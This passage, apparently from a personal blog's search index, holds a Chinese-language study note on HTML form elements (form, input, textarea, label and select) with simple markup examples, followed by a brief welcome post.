livecodeserver">&lt;form&gt;&lt;/form&gt;<br>所有标签都有的属性：<br>       id属性   用来标识元素的唯一性<br>       name属性 提交数据时的参数名<br>       style属性 设置元素的行内样式<br>       class属性 设置元素的样式名<br>       <br>必有属性：<br>action指定表单提交的地址，一般为服务器接口地址<br>method指定表单提交的方式，一般为<span class="hljs-built_in">get</span>或<span class="hljs-built_in">post</span><br><span class="hljs-built_in">get</span>提交 GET<br>        <span class="hljs-built_in">post</span>提交 POST<br>    target 提交数据时打开窗口的方式<br>    <span class="hljs-title">_self</span> 当前窗口<br>        <span class="hljs-title">_blank</span> 空白窗口<br>        <br>    <span class="hljs-built_in">get</span>请求和<span class="hljs-built_in">post</span>请求的区别：<br>    <span class="hljs-number">1.</span><span class="hljs-built_in">get</span>请求时参数会跟在浏览器地址后面，而<span class="hljs-built_in">post</span>请求不会<br>        <span class="hljs-number">2.</span><span class="hljs-built_in">get</span>请求相当于<span class="hljs-built_in">post</span>而言，不那么安全<br>        <span class="hljs-number">3.</span><span class="hljs-built_in">get</span>请求传递的数据长度是有限的，而<span class="hljs-built_in">post</span>请求基本没有（长度与服务器有关）<br>        <span class="hljs-number">4.</span><span class="hljs-built_in">get</span>请求比<span class="hljs-built_in">post</span>快（<span class="hljs-number">2</span>倍）<br>        <span class="hljs-number">5.</span><span class="hljs-built_in">get</span>请求有缓存，而<span class="hljs-built_in">post</span>无<br>        <br>        form是块级元素<br>        表单提交时，必须设置表单元素的name属性值，否则无法获取数据<br>        表单需要结合表单元素一起使用<br></code></pre></td></tr></table></figure><h3 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;&quot;&gt;<br><span class="hljs-keyword">type</span>属性：<br>    <span class="hljs-type">text</span>文本输入框<br><span class="hljs-keyword">password</span>密码输入框<br>checkbox复选框<br>radio单选框，如果需要单选，要设置<span class="hljs-type">name</span>属性<br>submit提交按钮，默认有一个“提交”的按钮<br><span class="hljs-keyword">reset</span>重置按钮，默认有一个“重置”的按钮<br>button按钮，默认只有一个方格，需要设置<span class="hljs-keyword">value</span>显示按钮的值<br>color颜色选择框<br>file上传文件按钮，如果需要上传多个文件，需要设置multiple<br>number数字输入框，只能输入数字<br><span class="hljs-type">date</span>日期选择框<br><span class="hljs-type">time</span>时间选择框<br><br>常用属性：<br><span class="hljs-keyword">value</span>    元素的值<br>readonly  只读状态<br>maxlength  最多输入的长度<br>disabled   禁用标签<br>checked单选框、复选框中表示默认选中<br>disabled表示禁用，不会被选择。代码如下：<br><br>如果要提交数据必须设置<span class="hljs-type">name</span>属性<br></code></pre></td></tr></table></figure><h3 id="textarea文本框标签"><a href="#textarea文本框标签" class="headerlink" title="textarea文本框标签"></a>textarea文本框标签</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br>常用属性：<br>cols规定文本区域内可见的列数<br>rows规定文本区域内可见的行数<br>value定义文本区域的内容<br>disabled设置为disabled将禁用文本区域<br>maxlength限制用户输入的最大字符数<br>placeholder规定一个简短的提示，描述文本区域期望的输入值<br>required设置为required会在提交表单时验证字段是否已填写‌<br></code></pre></td></tr></table></figure><h3 id="lable标签"><a href="#lable标签" class="headerlink" title="lable标签"></a>lable标签</h3><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">lable</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">lable</span>&gt;</span></span>标签可以 直接包含 表单 和 相关文字信息 , 点击 label 标签的范围 , 就可以触发表单的操作<br>常用属性：<br><span class="hljs-keyword">for</span>该属性值应该与相关控件<span class="hljs-built_in">的id</span>属性值相同<br>当用户点击<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>内的任何部分时，浏览器会自动将焦点转移到与之相关的表单控件上</span><br><span class="language-xml">例如：   </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span>用户名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span> </span><br><span class="language-xml">当点击用户名时会自动转移到输入文本框中</span><br></code></pre></td></tr></table></figure><h3 id="下拉框标签"><a href="#下拉框标签" class="headerlink" title="下拉框标签"></a>下拉框标签</h3><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></span><br>常用属性：<br>     multiple  设置下拉框多选<br>     size      设置下拉框可见选项数<br>     disabled  禁用元素<br>     <br><span class="hljs-keyword">option</span>：下拉框的选项标签<br>      selected  默认选中值<br>      disabled  禁用某个选项<br>      <span class="hljs-keyword">value</span>     提交给服务器的选项值<br>例如：<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">multiple</span>=<span class="hljs-string">&quot;multiple&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;q[]&quot;</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>选择一个站点<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;RUNOOB&quot;</span>&gt;</span>Runoob<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;GOOGLE&quot;</span>&gt;</span>Google<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;TAOBAO&quot;</span>&gt;</span>Taobao<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>效果图：</p><p><img src="/../image/%E4%B8%8B%E6%8B%89%E6%A1%86.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>welcome</title>
      <link href="/2024/12/25/welcome/"/>
      <url>/2024/12/25/welcome/</url>
      
        <content type="html"><![CDATA[<p>欢迎来我的博客</p><p><img src="/../image/01.jpg"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
